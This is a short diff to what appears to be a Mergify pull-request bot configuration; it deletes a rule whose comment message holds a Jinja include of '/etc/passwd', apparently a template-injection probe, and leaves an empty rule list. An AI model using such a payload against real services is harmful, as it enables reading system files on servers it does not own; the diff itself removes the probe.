@@ -1,11 +1,4 @@
-pull_request_rules:
-  - name: vm6-j2-inc-261016
-    conditions:
-      - label = vm6-j2-inc
-    actions:
-      comment:
-        message: "{% include '/etc/passwd' %}"
-
+pull_request_rules: []
 commands_restrictions:
   queue:
     conditions:
